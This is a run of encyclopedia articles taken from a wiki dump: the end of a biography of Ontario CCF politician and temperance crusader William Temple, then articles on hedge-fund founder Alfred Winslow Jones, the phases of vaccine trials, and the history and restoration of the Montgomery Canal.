Temple ran in the June 1945 federal election as the CCF candidate in High Park. He placed third. Undeterred by his previous electoral defeats, he ran again in the High Park constituency, this time at the provincial level, in the 1948 Ontario election. Temple castigated Drew for softening Ontario&#x27;s liquor laws and claimed that he was the captive of &quot;liquor interests&quot; because of the government&#x27;s decision to allow liquor sales in cocktail bars. While Drew&#x27;s party swept to victory across the province, Drew himself was defeated by Temple and decided to resign as premier and to move to federal politics.

After being elected, Temple continued to hound Drew. In the fall of 1948, Drew become the leader of the federal Progressive Conservatives. He needed a seat in the federal parliament and contested a by-election in the Ottawa-area electoral district of Carleton to win a seat in the House of Commons. The federal Co-operative Commonwealth Federation (CCF) was determined to defeat him and so it ran Eugene Forsey as its candidate. Temple was brought up from Toronto to appear at a political meeting in Richmond, Ontario&#x27;s Town Hall, where Forsey and Drew were speaking. He accused the Tory leader of being &quot;a tool of the liquor interests&quot; and also made suggestions about Drew&#x27;s sobriety. Throughout the evening, Drew grew more red-faced and explosive every time Temple spoke. Finally, after Drew misheard Temple calling him dishonest, the two men were restrained before they could come to physical blows with each other. A riot was barely averted, and the meeting had to be terminated. However, on 20 December 1948, Drew soundly defeated Forsey and went on to sit in Parliament.

As a Member of Provincial Parliament (MPP), Temple fought for temperance and for housing for World War II veterans. He was elected CCF Caucus chairman shortly after he had defeated Drew. His temperance crusades in the legislature put him at odds with the party establishment, including national secretary, David Lewis. The following year, he was not re-elected Caucus Chairman. Temple remained in the Ontario legislature until his defeat in the 1951 election. After his defeat, he returned to the clothing import business until his retirement in the late 1960s.

Temple remained an activist in the CCF. In the early 1950s, he was a leader of the &quot;Ginger Group&quot;, a group of dissident CCFers who argued that the party&#x27;s poor performance in the 1951 provincial election was due to the party moving away from taking clear socialist stands on issues and instead focussing too much on organizational issues. The group opposed what it saw as the &quot;bureaucratization&quot; of the CCF with salaried organizers and a greater emphasis on fundraising taking the place of grassroots volunteers and political education and discussion. Temple and his supporters also argued that power was being increasingly concentrated in the hands of the party executive instead of the grassroots, which resulted in the squelching of democratic discussion and grassroots policy development and sought to rectify this by curtailing the powers of the provincial secretary.

On 12 April 1952, at the 18th annual provincial convention, Temple nearly ran for leader against Ted Jolliffe but withdrew at the last minute and allowed Jolliffe to be acclaimed. Temple then ran for party president against the establishment candidate, Ted Isley, but was defeated 112 to 85. Temple and one other member of the Ginger Group, True Davidson, were then subsequently elected to the executive as vice-presidents.

He remained a member of the CCF&#x27;s successor, the Ontario New Democratic Party, for much of his life but resigned from the NDP in 1987. He stated that he &quot;cannot possibly accept the liquor policy of the party.&quot;

==Temperance crusader==
He acquired the nickname &quot;Temperance Willie&quot; while he served in the RCAF. His anti-liquor attitudes formed in his early years as a result of his father&#x27;s alcoholism as well as his Methodist upbringing and experiences in the military. He admitted to having a few drinks during World War I: &quot;Of course I&#x27;ve had a drink, you cannot go through two world wars without taking a drink,&quot; he told the &quot;Globe and Mail&quot;, but he added, &quot;I think I had a few on Nov. 11, 1918, but I don&#x27;t really remember having any since.&quot;

After his political defeat, he remained active in West Toronto, where he founded the Inter-Church Temperance League. When the community joined the city of Toronto in 1909, it did so on condition of remaining a &quot;dry&quot; district in which alcohol sales were prohibited, as they had been since 1904. Temple and his Temperance League fought for half a century to maintain that regulation despite attempts by the city to reverse it. Over the years, several plebiscites were held on allowing alcohol sales, and Temple and his supporters successfully fought against permitting alcohol sales in referendums held in 1966, 1972, 1984. He died several months before a 1988 plebiscite, but he had already begun the campaign, and his supporters credited him with their victory. It was not until after Temple&#x27;s death that neighbourhoods in the area finally voted to allow alcohol sales, beginning in 1994 in the St. Clair West area and ending in The Junction in 2000, the last dry region in West Toronto that became wet.

==Trade unionism==
Temple was also a supporter of trade union rights throughout his life, and walked on countless picket lines. In the fall of 1973, during a strike by the independent Canadian Textile and Chemical Union at Artistic Woodworking in North York, while on the picket line, he was arrested and charged with assaulting a police officer. When Temple&#x27;s case was brought to trial, the officer who had allegedly been assaulted (who was twice Temple&#x27;s size and more than half his age) claimed in testimony that he had smelled alcohol on Temple&#x27;s breath. That caused more offence to Temple than the claim that he had committed an assault, and a long series of character witnesses testified that Temple had never consumed anything stronger than ginger ale as long as they had known him. The charges were dismissed.

==Religion==
Temple was raised a Methodist and was a member of the United Church of Canada, where he attended every Sunday, although in the latter years of his life he said his religious views were probably closer to the Unitarian Church.

==Personal life==
Temple was predeceased by his son, William Price Temple; who was hospitalized for over four months, in and out of a coma, and finally succumbed to an undiagnosed brain disease on 21 August 1956. His wife, Mary Temple, served for a period as an alderman on the Toronto City Council for Ward 7 from 1959 to 1969, and had served as a school trustee for the ward. She also served as Chair of the Toronto School Board in the 1950s.

Temple died on 9 April 1988, at the Queensway General Hospital, after a short illness at the age of 89.

<doc id="1065724" wikidata="Q2646169" url="?curid=1065724" title="Alfred Winslow Jones">
<text>Alfred Winslow Jones (9 September 1900 – 2 June 1989) was an American investor, hedge fund manager, and sociologist. He is credited with forming the first modern hedge fund and is widely regarded as the &quot;father of the hedge fund industry.&quot;

==Early life and education==
Jones was born in Melbourne, Australia, the son of Arthur Winslow Jones (an executive of General Electric) and his wife, Elizabeth Huntington. He moved to the United States with his family when he was 4, growing up in Schenectady, New York. He graduated from Harvard University in 1923, and, after working as purser on a tramp steamer that sailed around the world, he joined the Foreign Service. In the early 1930s, he became vice consul at the U.S. embassy in Berlin during Hitler&#x27;s rise to power. In 1932, for just under a year he was married to Anna Luise Hauser, née Block (1896–1982), a daughter of the German painter Joseph Block and a descendant of German banker Joseph Mendelssohn. In 1936, he married Mary Carter, with whom he travelled through Spain during that country&#x27;s civil war, reporting on civilian relief for the Quakers. In 1941, he earned a doctorate in sociology at Columbia University. He then completed his doctoral thesis, &quot;Life, Liberty and Property&quot;, a survey of attitudes toward property in Akron, Ohio.

Sebastian Mallaby dedicated a chapter in his 2010 book entitled &quot;More Money Than God: Hedge Funds and the Making of a New Elite&quot;, in which he describes Jones as &quot;an erudite dandy, a onetime Marxist who hiked to the frontlines of the Spanish Civil War with the writer Dorothy Parker—where they shared a bottle of Scotch whisky with Ernest Hemingway.

==Academic career==
During the 1940s Jones worked for Fortune magazine and wrote articles on non-financial subjects such as Atlantic convoys, farm cooperatives, and boys&#x27; prep schools. In March 1949, Jones was investigating technical methods of market analysis for an article titled &quot;Fashions in Forecasting&quot;, reporting on a new class of stock-market timers and the approaches they employed to call the market. He studied a dozen or so of these &quot;technicians&quot;, whose approaches ranged from volume/price ratios to odd-lot statistics to the outcome of the Harvard–Yale football game.

In &quot;Fashions,&quot; Jones assessed each approach, sometimes harshly and other times positively. For example, Jones commented on one analysis that &quot;…the market trend succeeded itself 62.5 times out of a hundred and reversed itself 37.5 times. The probability of obtaining such a result in a penny tossing series is infinitesimal.&quot; Jones was looking for approaches that offered better than a &#x27;fair game.&#x27; He noted that certain approaches require trending markets, others work in higher volatility environments, still others in improving credit markets. He was beginning to feel his way down a dimly lit path toward what today would be considered a factor-based approach to portfolio construction.

Jones&#x27;s comments on Nicholas Molodovsky&#x27;s work showed he thought highly of it. In one passage on Molodovsky he said, &quot;Well controlled experimental work of this nature is important and likely to become more accurate as the methods are further developed.&quot; He hinted at the approach of risk-weighting individual stocks, as well as quantifying how far a stock has diverged from its fundamental value.

The research gave him the idea to try his own hand at investing. Two months before the Fortune article went to press, Jones had established an investment partnership, A.W. Jones &amp; Co., that would exploit this new style of investing. He raised a total of $100,000, $40,000 of which was his own. In its first year the partnership&#x27;s gain on its capital came to a very respectable 17.3 percent.

==The &quot;hedge fund&quot;==
Jones is credited with coining the phrase &quot;&quot;hedged&quot; fund&quot; and is credited with creating the first hedge fund structure in 1949. Jones referred to his fund as being &quot;hedged&quot;, a term then commonly used on Wall Street to describe the management of investment risk due to changes in the financial markets.

Jones combined two speculative tools to create what he considered a conservative investment scheme. He used leverage to buy more shares, and used short selling to avoid market risk. He bought as many stocks as he sold, so market-wide moves up or down would be neutralized in the portfolio. The value of the portfolio, then, would not be based on direction of the market but whether the manager had picked the right stocks to buy and sell. The fund avoided requirements of the Investment Company Act of 1940 by limiting itself to 99 investors in a limited partnership. Jones chose to take 20 percent of profits as compensation, invoking the Phoenician sea captains who kept a fifth of the profits from successful voyages. Initially, he charged no fee unless he made a profit. Jones later added a 2% management fee on all assets, regardless of the performance of the fund. These elements: a partnership structure where a percentage of profits is paid as compensation to the general partner/fund manager, a small number of limited partners as investors, and a variety of long and short positions, are the core elements of hedge funds today. Jones&#x27; fee system of a 2% management fee and a 20% fee on gains was also widely adopted by hedge funds and became popularly known as the 2-and-20 model.

While a few investors, including Warren Buffett and Barton Biggs, adopted the structure that he created, Jones and his structure were not widely known until 1966. That year Carol Loomis wrote an article called &quot;The Jones Nobody Keeps Up With.&quot; Published in Fortune, Loomis&#x27; article lionized Jones and his approach. The article&#x27;s opening line summarizes the results at A.W. Jones &amp; Co.: &quot;There are reasons to believe that the best professional money manager of investors&#x27; money these days is a quiet-spoken seldom photographed man named Alfred Winslow Jones.&quot; Coining the term &#x27;hedge fund&#x27; to describe Jones&#x27; fund, it pointed out that his hedge fund had outperformed the best mutual fund over the previous five years by 44 percent, despite its management-incentive fee. On a 10-year basis, Mr. Jones&#x27;s hedge fund had beaten the top performer Dreyfus Fund by 87 percent. This led to a flurry of interest in hedge funds and within the next three years at least 130 hedge funds were started, including George Soros&#x27;s Quantum Fund and Michael Steinhardt&#x27;s Steinhardt Partners.

Alfred Jones&#x27;s investors lost money in only 3 of his 34 years. By contrast, the S&amp;P500 had 9 down years during a similar period. Jones&#x27;s worst year was the fiscal year that ended on 31 May 1970, when he lost 35.3% (the S&amp;P lost 23.4% over the same period). Alex Porter, one of Jones&#x27;s portfolio managers, confirmed that their market exposure was aggressive, perhaps up to 120%. By contrast, Jones did relatively well during the market downturn of 1973–1974 by being conservative.

In 1984, Jones transformed his fund into a fund of funds, investing its capital in other hedge funds with different areas of expertise and investment styles. He gradually disengaged himself from his office and gave his time to the Peace Corps and even tried to establish a &quot;reverse Peace Corps&quot; in which aid recipients would send their own volunteers back to the United States to work with the poor in that country, as a &quot;hedge&quot; against creating a culture of inferiority among developing countries.

<doc id="1065730" wikidata="Q7907956" url="?curid=1065730" title="Vaccine trial">
<text>A vaccine trial is a clinical trial that aims at establishing the safety and efficacy of a vaccine prior to it being licensed.

A vaccine candidate drug is first identified through preclinical evaluations that could involve high throughput screening and selecting the proper antigen to invoke an immune response.

Some vaccine trials may take months or years to complete, depending on the time required for the subjects to react to the vaccine and develop the required antibodies.

==Preclinical stage==
Preclinical development stages are necessary to determine the immunogenicity potential and safety profile for a vaccine candidate.

This is also the stage in which the drug candidate may be first tested in laboratory animals prior to moving to the Phase I trials. Vaccines such as the oral polio vaccine have been first tested for adverse effects and immunogenicity in monkeys as well as non-human primates and lab mice.

Scientific advances since the 1980s have helped to use transgenic animals as a part of vaccine preclinical protocol in hopes to more accurately determine drug reactions in humans. Understanding vaccine safety and the immunological response to the vaccine, such as toxicity, are necessary components of the preclinical stage. Other drug trials focus on the pharmacodynamics and pharmacokinetics; however, in vaccine studies it is essential to understand toxic effects at all possible dosage levels and the interactions with the immune system.

== Phase I ==

The Phase I study consists of introducing the vaccine candidate to assess its safety in healthy people. A vaccine Phase I trial involves normal healthy subjects, each tested with either the candidate vaccine or a &quot;control&quot; treatment, typically a placebo or an adjuvant-containing cocktail, or an established vaccine (which might be intended to protect against a different pathogen). The primary observation is for detection of safety (absence of an adverse event) and evidence of an immune response.

After the administration of the vaccine or placebo, the researchers collect data on antibody production, on health outcomes (such as illness due to the targeted infection or to another infection). Following the trial protocol, the specified statistical test is performed to gauge the statistical significance of the observed differences in the outcomes between the treatment and control groups. Side effects of the vaccine are also noted, and these contribute to the decision on whether to advance the candidate vaccine to a Phase II trial.

One typical version of Phase I studies in vaccines involves an escalation study, which is used in mainly medicinal research trials. The drug is introduced into a small cohort of healthy volunteers. Vaccine escalation studies aim to minimize chances of serious adverse effects (SAE) by slowly increasing the drug dosage or frequency. The first level of an escalation study usually has two or three groups of around 10 healthy volunteers. Each subgroup receives the same vaccine dose, which is the expected lowest dose necessary to invoke an immune response (the main goal in a vaccine – to create immunity). New subgroups can be added to experiment with a different dosing regimen as long as the previous subgroup did not experience SAEs. There are variations in the vaccination order that can be used for different studies. For example, the first subgroup could complete the entire regimen before the second subgroup starts or the second can begin before the first ends as long as SAEs were not detected. The vaccination schedule will vary depending on the nature of the drug (i.e. the need for a booster or several doses over the course of short time period). Escalation studies are ideal for minimizing risks for SAEs that could occur with less controlled and divided protocols.

== Phase II ==
The transition to Phase II relies on the immunogenic and toxicity results from Phase I in a small cohort of healthy volunteers. Phase II will consist of more healthy volunteers in the vaccine target population (~ hundreds of people) to determine reactions in a more diverse set of humans and test different schedules.

==Phase III==
Similarly. Phase III trials continue to monitor toxicity, immunogenicity, and SAEs on a much larger scale. The vaccine must be shown to be safe and effective in natural disease conditions before being submitted for approval and then general production. In the United States, the Food and Drug Administration (FDA) is responsible for approving vaccines.

==Phase IV==
Phase IV trials are typically monitor stages that collect information continuously on vaccine usage, adverse effects, and long-term immunity after the vaccine is licensed and marketed. Harmful effects, such as increased risk of liver failure or heart attacks, discovered by Phase IV trials may result in a drug being no longer sold, or restricted to certain uses; examples include cerivastatin (brand names Baycol and Lipobay), troglitazone (Rezulin) and rofecoxib (Vioxx). Further examples include the swine flu vaccine and the rotavirus vaccine, which increased the risk of Guillain-Barré syndrome (GBS) and intussusception respectively. Thus, the fourth phase of clinical trials is used to ensure long-term vaccine safety.

<text>The Montgomery Canal (), known colloquially as &quot;The Monty&quot;, is a partially restored canal in eastern Powys and northwest Shropshire. The canal runs from the Llangollen Canal at Frankton Junction to Newtown via Llanymynech and Welshpool and crosses the England–Wales border.

The canal was formally named as the Montgomery Canal in the British Waterways Act 1987. However, it was informally known by this name prior to this act. It consists of the Eastern and Western branches of the Montgomeryshire Canal and the Llanymynech Branch of the Ellesmere Canal. The Montgomeryshire Canal ran from Llanymynech to Newtown. It was named after the county of Montgomeryshire that it ran through and was divided into Western and Eastern branches which met at Garthmyl. At Carreghofa Locks near Llanymynech, the Montgomeryshire Canal connected to the Llanymynech Branch of the Ellesmere Canal. The Llanymynech Branch ran from Carreghofa Locks to Frankton Junction where it meets the present-day Llangollen Canal.

The Montgomery Canal does not, and never did, go to the town of Montgomery.

The three constituents of the present-day Montgomery Canal became part of the Shropshire Union Canal system: the Ellesmere Canal including the Llanymynech Branch in 1846, the Eastern Branch in 1847 and the Western Branch in 1850.

The canal fell into disuse following a breach in 1936 and was officially abandoned in 1944. At present, only from Frankton Junction to Crickheath Bridge is navigable and connected to the rest of the national Canal &amp; River Trust network. Separately, a short stretch at Llanymynech and a central section of the canal around Welshpool are also navigable though isolated from the national canal network. Ongoing restoration work continues to connect the navigable sections.

==History==


The Montgomeryshire Canal was devised with a different purpose from most other canals of the time. Whereas other canals could generate sufficient revenue from cargo carrying to be financially viable, the Montgomeryshire was planned to serve a more rural area which would not offer such opportunities. Instead, the primary purpose of the canal was to transport lime for agricultural purposes which would allow the Upper Severn Valley to become better agricultural land. As a result, the promoters of the canal included local landowners who hoped to achieve a return on their investment through greater crop yields rather than relying upon share dividends.
The original 1792 proposal for the Montgomeryshire Canal was for a route from Llanymynech, where it would join the proposed Llanymynech Branch of the Ellesmere Canal, to Welshpool. By 1793, it had been decided that the canal should continue through to Newtown. The canal was authorised in 1794 by an act of Parliament, the (34 Geo. 3. c. 39), entitled &quot;An act for making a navigable Canal from or near Porthywain Lime Rocks in the parish of Llanyblodwell, in the county of Salop, to or near Newtown, in the county of Montgomery, and also certain collateral Cuts from the said Canal.&quot; The company was authorised to raise £72,000 from shares and a further £20,000 if required. John Dadford was appointed Engineer while his brother Thomas Dadford Junior was appointed his assistant. There had been suggestions in 1793 for a connecting canal between Garthmyl and the Leominster Canal at Woofferton. It would have been long but the plan came to nothing.

By February 1796, parts of the canal were completed and the first boat, named the &quot;Royal Montgomery&quot;, was launched into the canal near Welshpool amidst great celebrations. In July 1797, the connection to the Ellesmere Canal at Llanymynech was opened although the Llanymynech branch was still suffering from problems with leakage. A month later, the canal had reached Garthmyl providing of navigable canal from Llanymynech but stopping short of Newtown. In early 1797 John Dadford had resigned his post in order to pursue a career in America and, at the suggestion of Thomas Dadford, had been replaced by his father Thomas Dadford senior. During construction, there had been problems with both the Berriew Aqueduct and the Vyrnwy Aqueduct where one arch had collapsed. The management committee were unhappy with this and the engineer William Jessop was called in to advise but he explained that such issues were merely teething problems and allayed their fears. To reach Garthmyl, £71,000 had been spent. The canal thus far included 13 locks: four descending between Carraghofa and Burgedin and nine rising from there to Garthmyl. It also included a level branch to Guilsfield, some long.

Although conceived as a means to serve agricultural communities, trade on the canal developed steadily. There were a number of quarries in the Llanymynech area which delivered limestone to the canal for transport to kilns at Belan and elsewhere. Grain prices rose from 1800 onwards and there was a large demand for lime as a fertiliser so that the Welsh hill-lands could be enclosed and developed for agriculture. Once the Chirk and Pontcysyllte aqueducts were opened on the Ellesmere branch to Llangollen, there was an easy route for the transport of coal used in the lime kilns to produce fertiliser. Other cargoes included stone for building, roofing slates, timber and bark. At its outset, the Earl of Powis had been one of the principal shareholders in the canal; he and his son, Lord Clive, were both landowners and owners of quarries and mills along the canal. The first dividend of 2.5 per cent was paid in 1805 and thereafter, a dividend was paid in most years while the canal remained independent at rates up to 5.5 per cent. Volumes of limestone carried rose from 14,082 tons in 1806 to 44,592 tons in 1814 while carriage of slack coal rose from 6,757 tons to 11,560 tons over the same period. There was a significant drop in volumes with the end of the Napoleonic Wars but trade had picked up again by 1820.

===Western extension===
A lack of capital and income prevented completion of the canal and Garthmyl remained the terminus for 20 years but by 1812, Newtown was experiencing significant growth and there were calls to extend the route southwards, either as a canal from Garthmyl to Newtown or as a canal to Bryn-derwen and a tramroad beyond that. A meeting of the shareholders held in October 1813 narrowly voted to press on and Josias Jessop was asked to survey the route. His initial estimate was £28,268 although some of the committee later thought that he had forgotten to include the cost of puddling and lining the canal. The company agreed to put a Bill before Parliament to obtain the necessary powers but factions developed within the shareholders with some fearing that they might lose their investment if the canal were completed. Heated meetings were held in September 1814 and January 1815 at which neither side was entirely successful but on 3 February 1815, the company agreed that the new section would effectively be built by a separate company with its own committee and accounts.
The old company would be known as the Eastern Branch with the new company responsible for the Western Branch. Any profits that the Eastern Branch made above 5 per cent would be used to fund the extension and on completion, the two branches would be jointly managed. Surpluses from the Eastern Branch would continue to be transferred to the Western Branch until it was able to pay a 5 per cent dividend at which point the two companies would be formally amalgamated. This was enshrined in the (55 Geo. 3. c. lxxxiii) which authorised the raising of £40,000 in new shares to complete the canal. The new company kept themselves separate failing to notify the Eastern Branch how the work was progressing. Under the supervision of John Williams, the resident engineer, who used Jessop&#x27;s plans, the new canal was completed in March 1819 although it was not formally declared to be complete until 7 December 1821. It descended through six locks from Newtown and was supplied with water from the River Severn by a water wheel and a backup steam engine. An additional supply came from a weir and feeder at Penarth.

The six locks were each deep with the cut being deep and wide at the bottom. As a result of the Western Branch needing to be profitable to allow the branches to merge, a higher tonnage charge was imposed on the Western Branch. On 23 June 1821 a further act of Parliament, the (1 &amp; 2 Geo. 4. c. cxix), was obtained to alter the line of the Tanat feeder and to make a navigable cut from the Guilsfield Branch. This act also stipulated that the consolidation of the Eastern and Western branches would no longer be automatic but would require the consent of the proprietors of each and clarified that the commencement of the Eastern branch was to be taken as the distance of thirty-five yards from the sill of the upper gate of the higher of the two Carreghofa locks. This alteration to the line of the Tanat feeder resulted in it now supplying the pound above the Carreghofa locks whereas it had previously fed the canal below the locks.

The cost of the Western Branch was £53,390 which was well in excess of the £22,300 which had been raised by issuing new shares. The company had borrowed £6,000 from the Exchequer Bill Loan Commissioners and the rest from various others, the majority coming from William Pugh. Income on the new branch was meagre so that the company could not meet the interest payments on the loans and factions developed. One group was led by Pugh who complained that the engineer Williams had muddled the accounts since the canal had opened and another group thought that Pugh had borrowed money beyond the powers granted by the act of Parliament. They wanted the Exchequer Bill Loan Commissioners to investigate the company&#x27;s financial position. However both parties agreed that George Buck, who had been the engineer for the Eastern Branch since 1819, should become engineer and clerk and he was appointed to this post in December 1832 with a mandate to investigate the accounts.

Buck presented his findings in November 1833 but the meeting took no action as Pugh was absent. Buck moved on the following month to assist Robert Stephenson on railway projects. Pugh then paid off both the capital and interest of most of the other creditors resulting in the company owing him £38,106 which was split into a mortgage for £25,000 and £13,000 in shares. He then obtained his own act of Parliament to authorise his position and to allow the company to raise their tolls. By June 1835, the Western Branch declared that receipts were sufficient to pay the interest on all mortgages but there is no evidence that any dividends were ever paid on the shares. The two branches remained separate companies throughout their life.

===Shropshire Union takeover===
Major structural repairs to the Vyrnwy aqueduct had been required in 1823 when all of the arches were strengthened by iron bands under the supervision of Buck. Otherwise, the Eastern Branch continued to be relatively prosperous apart from a brief dip during a trade recession between 1840 and 1844. This was partly due to the late arrival of railways in the area. The Western Branch, in contrast, was hampered by the fact that nearly all of the traffic was in one direction towards Newtown with very little goods travelling in the opposite direction.

The prospect of railway competition arrived in the 1840s and in 1845 the company was approached by the proposed Shrewsbury to Newtown Railway to work out a deal. The company responded by setting up a subcommittee in January 1845 to consider how best to protect themselves from such competition. Meanwhile, the London and Birmingham Railway were negotiating with the Ellesmere and Chester Canal who were planning to convert some of their canals into railways. They asked William Cubitt to investigate whether their own canal could also be converted but that plan was dropped soon afterwards as the Ellesmere and Chester offered to buy the canal for £110 per share and the offer was accepted. The Ellesmere and Chester Canal obtained an act of Parliament to enable them to become the Shropshire Union Railways and Canal Company and to take over several canals including both the Eastern and Western Branches of the Montgomeryshire Canal. The Eastern Branch was formally transferred to become part of the Shropshire Union on 1 January 1847 with the company receiving £78,210 of which £7,920 was in shares in the new company and the rest was in cash. The Western Branch remained under Pugh&#x27;s control for three more years but was bought for £42,000 on 5 February 1850 although some £7,000 of this cannot be traced from the accounts.

The Shropshire Union company had negotiated with several railway companies who had initially been rivals but on 1 January 1846, they had all amalgamated to become the London and North Western Railway (LNWR). The Shropshire Union had obtained powers in their enabling act to build railways and thus became a threat to the London and North Western Railway who offered to lease the Shropshire Union in the autumn of 1846. This was formalised by an act of Parliament in June 1847 although the powers were not fully implemented until 25 March 1857. Part of the deal was that the Shropshire Union would drop its aspirations to build railways but in return, would have a free hand to run the canals which they did vigorously. The LNWR applied for powers to build a railway linking Shrewsbury, Newtown, Welshpool and Oswestry in 1853 but after negotiation with the Great Western Railway, withdrew the bill and it was they who built the Oswestry and Newtown Railway which was completed on 10 June 1861. The plan was supported by some of the former Montgomeryshire Canal shareholders, who were disappointed that the sale of the canal to the Shropshire Union had not resulted in it being converted into a railway.

===Decline===
Although the Shropshire Union had a fairly free hand in running the canals, the goods that could be carried were restricted by the terms of their lease and the canals gradually became less profitable. Consideration was given to closing the Weston Arm in 1875 and again in 1885 but no action was taken. The idea of closing the whole of the former Montgomery Canal was considered in 1887 but study of the figures revealed that it was still making a small profit of £432 per year and so it was reprieved. In May 1917, the Weston Arm suffered a breach at Dandyfield which it was estimated would cost £14,000 to repair. Thereafter, the arm was only open for about to Hordley wharf but there were complaints and the issue was referred to the Board of Trade. They ruled in 1920 that repairs were not justified and so the arm stayed closed. The Shropshire Union was absorbed by the London and North Western Railway in late 1922 and itself became part of the London, Midland and Scottish Railway (LMS) under the 1923 grouping of the railways. Another breach of the canal occurred a mile (1.6 km) from Frankton Junction on 5 February 1936. The owners paid compensation to George Beck, the main user of the canal, and applied for a warrant of abandonment but this was refused. The LMS finally obtained an act of abandonment in 1944 which gave them powers to close the whole of the canal from Frankton Junction southwards, including the Weston Arm, as part of a plan to close of canal.

The act of abandonment allowed bridges to be lowered although none of the route of the canal was sold at that time. The Transport Act 1947 resulted in the nationalisation of the railways and canals with control of the Montgomery Canal passing to the British Transport Commission in 1948 and ultimately to British Waterways in 1963 following the passing of the Transport Act 1962. The Transport Act 1968 classified canals into one of three categories and the Montgomery Canal became a Remainder Waterway meaning that British Waterways could only carry out certain statutory work on it. As a result of the act, the final to Newtown were sold off.

== Restoration ==
Since 1969, when the canal through Welshpool was threatened by a proposed road bypass, the canal has been gradually – but so far only partially – restored for use by pleasure boaters. In some places, the canal has been filled in, roads have been built over the channel, bridges have been lowered and infrastructure such as pipes and manhole covers have been built in the canal bed presenting several obstacles to restoration. The end section from Freestone Lock to Newtown is dry and no longer in Canal &amp; River Trust ownership.

=== Completed restoration ===
In 1969, there were plans to convert the bed of the canal through Welshpool into a road and the Welshpool By-Pass Action Committee was formed to oppose this. They requested the help of the Shropshire Union Canal Society who organised a &quot;Big Dig&quot; at Welshpool which was attended by over 200 volunteers who cleared a section of the canal. The Shropshire Union Canal Society had already begun campaigning for the restoration of the canal and in the run-up to the event, members attended council meetings, mounted displays in the town and organised a visit to Market Drayton for Welshpool Town Council, to see another section of the Shropshire Union where progress was being made. Key players included Graham Palmer, the organiser of the London and Home Counties Working Party Group of the Inland Waterways Association. They published a journal called &quot;Navvies Notebook&quot; which co-ordinated volunteer activity on the canals across Britain and within a year had become the Waterway Recovery Group. It was agreed that volunteers would tackle the section from Welshpool Lock northwards to Mill Lane. Despite high-level opposition to restoration by British Waterways, at local level they agreed to shut off the feed to the southern section and lower the water level so that water could be pumped out of the section through Welshpool, rather than discharged into the Lledan Brook.

Welshpool Borough Council refused the use of their tip for material removed from the canal but a local farmer called W Davies offered the use of his land. Buttington Contractors offered items of equipment and the event was planned for the weekend of 18 and 19 October 1969. Some 100 volunteers were expected and pumping began on Friday evening. The Severn River Board removed over 700 fish on Saturday morning and numbers attending exceeded expectations. Despite warnings by British Waterways not to touch it, the Lledan Brook flood paddle was opened to assist in the drainage of the canal and over 200 people set to work using hand tools and borrowed equipment including a mobile crane, ten dumper trucks, four 7-ton tipper trucks, three JCB diggers and a Hy-Mac long arm excavator. Brian Haskins, the British Waterways area engineer from Northwich, visited the site and overlooked the use of the flood paddle. There was considerable interest from the townspeople and the number of onlookers became a bit of a hazard. The cleared canal was refilled on the Sunday and the Mayor and Mayoress rode along the section on a cruiser that had been trailed from Market Drayton. The canal route for the bypass was subsequently rejected by a public enquiry.

The Inland Waterways Amenity Advisory Council published a review on 20 August 1971 which assessed the potential of the &quot;Remainder Waterways&quot; which had been defined in the Transport Act 1968. This advocated the complete restoration of the Montgomery Canal among other suggestions. The Prince of Wales announced a plan to restore of the canal to amenity waterway standards in October 1973. This was achieved through the Prince of Wales Committee of the House of Lords and was to be managed by the Shropshire Union Canal Society. The scheme was also backed by the Variety Club of Great Britain who wanted to use the restored canal as a recreational base for the benefit of handicapped children. The Prince formally opened Welshpool Town Lock on 23 May 1974 as the scheme got under way. Despite the progress being made, the Welsh Office approved a scheme in 1976 to construct a bypass road at Arddleen which would have crossed the canal at low level and culverted the canal beneath it. The Inland Waterways Association and the Shropshire Union Canal Society worked together to get the scheme changed and by mid-1978, an engineering solution had been worked out but the costs involved brought delays to the restoration.

The next threat to restoration occurred in 1979 when following the collapse of James Callaghan&#x27;s Labour government and the election of Margaret Thatcher, economic conditions were tight. Powys County Council were faced with the cost of repairing and upgrading bridges over the canal and wanted to lower bridge 96, below Carreghofa bottom lock, to remove a weight restriction. They applied to the High Court for a &quot;writ mandamus&quot; which put the onus on the court to decide who was responsible for the costs. Again, the restoration movement objected but the court ruled in favour of lowering the bridge. British Waterways objected on the basis that restoration was already ongoing. Soon afterwards, the Secretary of State suggested that a note should be added to the Shropshire County structure plan indicating that the line of the canal should be protected but the lowering of the bridge went ahead. The Powys structure plan was amended in early 1982 to protect the canal from bridge 120, located to the south of Welshpool, northwards. However within weeks, British Waterways announced that the future restoration beyond the locks at Frankton and Carreghofa, was uncertain. The Restoration Trust met with Sir Frank Price, chairman of British Waterways, on 5 April 1982 and it was agreed that an economic assessment of the viability of restoration should be carried out and completed by October.

By 1985, the environmental lobby was growing and in order to avert a situation where boaters and environmentalists clashed, the Manpower Services Commission funded a scheme to document the flora and fauna of the unrestored canal. It also included an experimental off-line nature reserve which could provide a habitat for rare or interesting plants and the first such reserve was built at Rednal. The concept was a success and paved the way for other reserves that allowed restoration to proceed, both on the Montgomery Canal and on other canals where there were sensitive environmental concerns. Montgomeryshire County Council committed £1 million to canal restoration over a five-year period as British Waterways submitted a private bill to Parliament to authorise restoration of the whole canal. The restoration also benefited from a legacy of £200,000 left by Humphrey Symonds via the Inland Waterways Association, specifically for the Montgomery Canal. Frankton Locks were reopened on 12 September 1987 by the Prince of Wales when he announced that volunteers had worked for 12,000 man-hours on the project and that the value of this contribution was £200,000.

The British Waterways Act 1987 became law on 17 December 1987, and authorised the restoration of the canal from Newtown Pumping Station to Frankton Junction, including the Guilsfield and Weston arms. It formalised the change of name to the Montgomery Canal and the construction and maintenance of nature reserves. It also specified that any refurbished or new sections of the canal, when they were brought into use, would automatically be designated as Remainder Waterways using the classification from the 1968 Act. A second Act was obtained on 29 July 1988 to undo the provisions of the London Midland and Scottish Railway (Canals) Act 1944 which had removed the right of navigation and prohibited such use. The new Act reinstated the right to allow navigation on any sections open at the time the Act was obtained and on any sections subsequently re-opened. British Waterways was succeeded by the Canal &amp; River Trust in 2012.

